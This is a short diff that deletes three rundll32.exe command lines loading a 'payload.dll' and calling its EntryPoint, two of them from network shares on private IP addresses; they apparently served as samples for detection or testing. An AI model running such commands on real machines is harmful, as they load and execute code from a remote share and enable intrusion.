@@ -1,3 +1,0 @@
-rundll32.exe //192.168.1.1/share/payload.dll,EntryPoint
-rundll32.exe "payload.dll",EntryPoint
-rundll32.exe //192.168.1.100/share/payload.dll,EntryPoint
